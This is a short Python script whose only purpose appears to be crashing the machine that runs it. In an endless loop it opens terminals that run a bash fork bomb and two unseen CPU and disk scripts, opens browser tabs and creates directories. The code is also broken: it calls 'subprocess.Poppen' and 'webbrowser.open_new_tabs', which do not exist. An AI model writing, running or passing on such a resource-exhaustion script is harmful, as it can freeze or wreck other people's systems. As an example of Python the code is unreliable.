import os, subprocess, webbrowser

commands = [
  "bash cpu.sh",
  ":(){ :|: & };:",
  "bash disk.sh"
]

os.system(f"chmod +x cpu.sh")
os.system(f"chmod +x disk.sh")

i = 0
while True:
  for cmd in commands:
    subprocess.Poppen(["gnome-terminal", "--", "bash", "-c", cmd])
    webbrowser.open_new_tabs("https://www.growden.io")
    webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")
    os.mkdir(str(i))
  i += 1